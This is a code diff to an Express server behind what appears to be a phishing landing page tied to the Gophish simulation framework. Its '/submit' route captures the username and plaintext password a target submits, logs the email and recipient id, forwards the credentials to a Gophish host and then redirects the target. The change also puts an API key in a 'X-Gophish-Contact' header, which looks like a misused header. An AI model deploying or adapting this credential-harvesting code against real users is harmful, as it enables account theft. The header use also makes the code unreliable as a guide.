@@ -23,25 +23,31 @@ app.post('/submit', async (req, res) => {
   console.log(`Captured → Email: ${username} | RID: ${rid}`)
 
   try {
-    // Correct Gophish endpoint to report submitted data
-    const response = await axios.post(
+    // Correct way — POST to Gophish with rid as query param
+    await axios.post(
       `${GOPHISH_HOST}/?rid=${rid}`,
-      new URLSearchParams({ username, password }),
+      new URLSearchParams({ 
+        username: username, 
+        password: password 
+      }).toString(),
       {
         headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'X-Gophish-Contact': GOPHISH_API_KEY
         },
-        httpsAgent
+        httpsAgent,
+        maxRedirects: 0,
+        validateStatus: (status) => status < 500
       }
     )
-    console.log(`Reported to Gophish ✅ Status: ${response.status}`)
+    console.log(`Reported to Gophish ✅`)
   } catch (err) {
-    console.error('Gophish API error:', err.message)
+    console.error('Gophish error:', err.message)
   }
 
   res.redirect(REDIRECT_URL)
 })
 
 app.listen(process.env.PORT || 3000, () => {
-  console.log('Landing page server running')
+  console.log('Server running')
 })
